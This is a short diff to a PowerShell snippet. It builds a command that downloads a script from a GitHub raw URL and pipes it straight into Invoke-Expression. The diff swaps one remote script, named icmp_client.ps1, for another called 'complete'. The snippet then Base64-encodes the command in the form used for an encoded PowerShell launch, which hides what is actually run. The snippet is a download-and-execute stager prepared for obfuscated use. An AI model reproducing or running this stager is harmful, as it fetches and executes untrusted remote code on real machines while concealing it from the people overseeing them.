@@ -1,4 +1,4 @@
-$Text = ‘iwr https://raw.githubusercontent.com/Clickest/a/master/icmp_client.ps1|iex’
+$Text = ‘iwr raw.githubusercontent.com/Clickest/a/master/complete|iex’
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 $EncodedText =[Convert]::ToBase64String($Bytes)
 $EncodedText
